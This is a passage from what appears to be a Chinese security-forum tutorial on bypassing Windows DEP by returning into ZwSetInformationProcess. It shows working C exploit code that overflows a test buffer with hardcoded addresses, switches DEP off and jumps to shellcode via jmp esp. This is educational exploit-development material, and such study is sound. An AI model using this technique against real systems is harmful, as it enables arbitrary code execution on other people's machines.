
由于`DEP`不允许我们直接到非可执行页执行指令，我们就需要在其他可执行的位置找到符合我们要求的指令，让这条指令来替我们工作，为了能够控制程序流程，在这条指令执行后，我们还需要一个返回指令，以便收回程序的控制权，然后继续下一步操作，整体流程如下图所示：

![](https://bbs.kanxue.com/upload/attach/202201/835440_BJPFRJGHTWM6XAK.jpg)

简而言之，只要为`shellcode`中的每条指令都在代码区找到一条替代指令，就可以完成`exploit`想要的功能了。但是由于该方法难度过大，因此在此思想上，可以使用以下三种方法来达成目标：

- 通过跳转到`ZwSetInformationProcess`函数将`DEP`关闭后再转入`shellcode`执行
- 通过跳转到`VirtualProcess`函数来将`shellcode`所在的内存页设置为可执行状态，然后再转入`shellcode`执行
- 通过跳转到`VirtualAlloc`函数开辟一段具有执行权限的内存空间，然后将`shellcode`复制到这段内存中执行

## 2. ZwSetInformationProcess

一个进程的`DEP`标识保存在进行内核对象`KPROCESS`结构体中偏移`0x06B`的`Flags`字段上，该字段的类型为`_KEXECUTE_OPTIONS`，定义如下：

```
kd> dt _KEXECUTE_OPTIONS

nt!_KEXECUTE_OPTIONS

   +0x000 ExecuteDisable   : Pos 0, 1 Bit

   +0x000 ExecuteEnable    : Pos 1, 1 Bit

   +0x000 DisableThunkEmulation : Pos 2, 1 Bit

   +0x000 Permanent        : Pos 3, 1 Bit

   +0x000 ExecuteDispatchEnable : Pos 4, 1 Bit

   +0x000 ImageDispatchEnable : Pos 5, 1 Bit

   +0x000 Spare            : Pos 6, 2 Bits
```

这些标识中前`4`个`bit`与`DEP`相关，当前进程`DEP`开启时`ExecuteDisable`位被置`1`，当进程`DEP`关闭时`ExecuteEnable`位被置`1`，`DisableThunkEmulation`是为了兼容`ATL`程序设置的，`Permanent`被置`1`后表示这些标志不能再被修改。真正影响`DEP`状态的是前两位，所以只需要将`Flasg`设置为`0x02`就可以将`ExecuteEnable`置`1`。

想要对该位进行设置，可以使用`ZwSetInformationProcess`函数，该函数定义如下：

```
NTSTATUS 

WINAPI 

ZwSetInformationProcess(__in HANDLE ProcessHandle,

                          __in PROCESSINFOCLASS ProcessInformationClass,

                          __out PVOID ProcessInformation,

                          __in ULONG ProcessInformationLength);
```

|  |  |
| --- | --- |
| **参数** | **含义** |
| `ProcessHandle` | 进程句柄 |
| `ProcessInformation` | 进程信息类；当指定为`ProcessExecuteFlags(0x22)`的时候表示要设置进程的`DEP`属性 |
| `ProcessInformation` | 指向保存要设置属性的地址，当设置为`0x2`且第二个参数为`0x22`的时候就可以关闭`DEP` |
| `ProcessInformationLength` | 第三个参数的长度 |

由此不难知道，如果利用该函数关闭`DEP`属性，接下来只需要再系统中找到该函数，覆盖的返回地址设为该函数地址，设置好参数的值以及`jmp esp`的地址就可以实现绕过`DEP`。由于的`exp`有`00`，如果使用`strcpy`会产生截断，所以改用下面的方式来产生漏洞：

```
char g_szExploit[100] = { 0 };

void test()
{
	char szStr[0x8] = { 0 };
	memcpy(szStr, g_szExploit, sizeof(g_szExploit));
}
```

漏洞利用代码，则如下：

```
int main()
{
	DWORD dwFuncAddr = 0x7C92E62D;											// ZwSetInformationProcess函数地址
	DWORD dwRetAddr = 0x7C961EED;											// jmp esp地址

	LoadLibrary("user32.dll");												// MessageBox函数在该中，需要将其导入才可以调用

	*(PDWORD)g_szExploit = 0x2;												// 参数三的值
	memset(g_szExploit + 4, 'A', 0x8);
	*(PDWORD)(g_szExploit + 0xC) = dwFuncAddr;								// 跳转到ZwSetInformationProcess函数地址
	*(PDWORD)(g_szExploit + 0x10) = dwRetAddr;								// 覆盖返回地址(jmp esp)
	*(PDWORD)(g_szExploit + 0x14) = -1;										// 4个参数
	*(PDWORD)(g_szExploit + 0x18) = 0x22;
	*(PDWORD)(g_szExploit + 0x1C) = (DWORD)g_szExploit;							
	*(PDWORD)(g_szExploit + 0x20) = 0x4;							
	memcpy(g_szExploit + 0x24, g_szShellCode, sizeof(g_szShellCode));		// 保存ShellCode

	test();

	system("pause");

	return 0;
}
```

编译程序后放入调试器，运行到`memcpy`之后可以看到此时返回地址已经被覆盖成`ZwSetInformationProcess`函数地址，且随后参数也已经正确传递

![](https://bbs.kanxue.com/upload/attach/202201/835440_Z9P9VTHYFR4SBC3.jpg)

在`ZwSetProcess`函数处下断点，程序成功断下，接下来就会进入内核设置`DEP`属性

![](https://bbs.kanxue.com/upload/attach/202201/835440_JGAVY9NQN8BWYUS.jpg)

当程序返回用户层的时候，进程的`DEP`已经被关闭，此时的`esp`指向的是`jmp esp`指令的地址

![](https://bbs.kanxue.com/upload/attach/202201/835440_KYZAUHNHPZHGRJB.jpg)

继续运行就会执行`jmp esp`指令，跳转到`shellcode`，此时继续执行`shellcode`就会成功运行，不会触发`DEP`的机制

![](https://bbs.kanxue.com/upload/attach/202201/835440_HDWTVMX2CW9UU99.jpg)

剩下两种方法和该方法的做法一样，根据需要布置到栈空间就好。另外，如果进程中有可读可写可执行的区域，也可以将`shellcode`写入该区域，然后让程序跳转到该区域执行也可以绕过`DEP`机制。

## 八.参考资料

> - 《0day安全：软件漏洞分析技术》

[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)

最后于 2022-12-28 16:13

被1900编辑，原因：

[#漏洞分析](https://bbs.kanxue.com/forum-150-1-153.htm)

[#漏洞利用](https://bbs.kanxue.com/forum-150-1-154.htm)

[#缓冲区溢出](https://bbs.kanxue.com/forum-150-1-156.htm)

[#Windows](https://bbs.kanxue.com/forum-150-1-160.htm)
